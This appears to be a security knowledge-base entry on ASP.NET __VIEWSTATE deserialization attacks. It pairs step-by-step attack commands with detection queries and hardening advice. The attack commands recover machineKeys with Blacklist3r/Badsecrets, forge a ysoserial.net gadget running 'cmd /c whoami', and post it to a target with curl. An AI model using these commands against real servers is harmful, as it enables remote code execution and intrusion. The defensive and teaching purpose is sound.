name: ASP.NET __VIEWSTATE Deserialization Abuse
description: ASP.NET serializes page state into the __VIEWSTATE field using LosFormatter/ObjectStateFormatter. If the machineKey (validation/decryption keys) is known or leaked from web.config, an attacker forges a signed, optionally encrypted ViewState carrying a ysoserial.net gadget (TextFormattingRunProperties) that the server deserializes into remote code execution. Keys are recovered with Blacklist3r or Badsecrets, or by abusing default/leaked keys.
notes:
=== WHEN IS VIEWSTATE EXPLOITABLE ===
  # __VIEWSTATE is a base64 blob in every classic ASP.NET WebForms page.
  # Exploitable if you know the machineKey, OR validation is disabled (EnableViewStateMac=false, legacy),
  # OR the app uses a leaked/default key.

=== STEP 1: RECOVER THE MACHINEKEY ===
  # Blacklist3r (AspDotNetWrapper) brute-forces known/leaked keys against a captured ViewState:
  AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <viewstate> --purpose=viewstate --modifier=<generator> --macdecode
  # Badsecrets (python) does the same offline:
  python3 -m badsecrets.examples.blacklist3r --url https://<target>/page.aspx
  # Keys also leak via LFI/source disclosure of web.config <machineKey validationKey=... decryptionKey=...>.

=== STEP 2: FIND THE __VIEWSTATEGENERATOR ===
  # The hidden __VIEWSTATEGENERATOR field (e.g. CA0B0334) is the --generator value.

=== STEP 3: FORGE THE RCE VIEWSTATE ===
  # MAC only (no encryption):
  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --generator=<generator> --validationalg=SHA1 --validationkey=<validationkey>
  # MAC + encryption (modern default):
  ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/page.aspx" --apppath="/" --decryptionalg=AES --decryptionkey=<decryptionkey> --validationalg=HMACSHA256 --validationkey=<validationkey>
  # URL-encode the output and POST it as __VIEWSTATE.

=== DELIVERY ===
  curl -s https://<target>/page.aspx --data-urlencode "__VIEWSTATE=<forged>" --data "__VIEWSTATEGENERATOR=<generator>"

=== ALTERNATIVES ===
  Generic ysoserial.net formatters when the sink is not ViewState - see deser-dotnet-ysoserial
  CVE-2020-0688 (Exchange ECP) ships a hardcoded default validationKey for exactly this attack

recommended.note: Core ysoserial.net gadgets/formatters this builds on.

defense.why_it_works: ViewState is a serialized object graph. When the signing/encryption machineKey is weak, default, or leaked, an attacker can forge a valid ViewState carrying a gadget, and ObjectStateFormatter deserializes it server-side into code execution. Disabling ViewState MAC removes the integrity check entirely.
defense.prerequisites: A classic ASP.NET WebForms endpoint plus a known/leaked/default machineKey, or an app with ViewState MAC validation disabled.
defense.impact: Remote code execution in the IIS worker process as the app-pool identity.
defense.detection: [MITRE T1190] Oversized or malformed __VIEWSTATE POST bodies, repeated ViewState MAC validation failures (Event ID 4009 / ViewStateException in the application log); [MITRE T1059] w3wp.exe spawning shells.
defense.artifacts: IIS logs with large __VIEWSTATE POSTs; Windows Application log ASP.NET ViewState MAC validation errors; Sysmon/EDR w3wp.exe -> cmd.exe process tree; new files under the site temp dir.
defense.splunk_spl:
index=iis cs_method=POST (cs_uri_query="*__VIEWSTATE*" OR request_body="*__VIEWSTATE*")
| eval vs_len=len(request_body)
| where vs_len > 2000
| table _time, c_ip, cs_uri_stem, vs_len
defense.sentinel_kql:
Event
| where Source has "ASP.NET" and (RenderedDescription has "ViewState" and RenderedDescription has "validation")
| project TimeGenerated, Computer, RenderedDescription
defense.prevention: Keep EnableViewStateMac on; rotate machineKeys and never ship default/leaked keys; use AutoGenerate,IsolateApps keys; prefer DPAPI-protected keys; patch Exchange (CVE-2020-0688); restrict web.config disclosure; run app pools least-privileged.

detections.name: Repeated ASP.NET ViewState MAC validation failures
detections.logic:
Event
| where EventLog == "Application" and Source has "ASP.NET"
| where RenderedDescription has "ViewState" and RenderedDescription has_any ("MAC","validation","could not be verified")
| summarize Count=count() by Computer, bin(TimeGenerated, 10m)
| where Count > 3
detections.false_positives: Key rotation or load-balanced nodes with mismatched machineKeys
detections.tuning: Correlate failures with a following w3wp.exe child shell to raise confidence
